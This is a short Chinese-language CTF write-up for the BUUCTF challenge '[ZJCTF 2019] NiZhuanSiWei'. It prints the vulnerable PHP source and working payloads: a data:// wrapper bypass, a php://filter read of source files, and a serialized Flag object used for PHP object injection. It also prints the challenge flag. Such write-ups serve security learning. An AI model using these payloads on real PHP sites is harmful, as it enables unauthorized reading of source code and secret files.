## BUUCTF- [ZJCTF 2019]NiZhuanSiWei

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

代码审计

- 变量text`data://text/plain,welcome to the zjctf`
- 变量file `useless.php`

Payload：

```
?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php

得到一下内容，解码
PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
```

```php
<?php  
class Flag{  //flag.php  
    public $file="flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}
$a = new Flag();
echo serialize($a);
?>  
    
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";} 
```

![image-20240828225505051](C:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20240828225505051.png)

```html
<br><h1>welcome to the zjctf</h1></br>  
<br>oh u find it </br>

<!--but i cant give it to u now-->

<?php

if(2===3){  
	return ("flag{f71dd2e8-6e14-4658-b738-e234f836682a}");
}

?>
<br>U R SO CLOSE !///COME ON PLZ
```

借助`password`来获得flag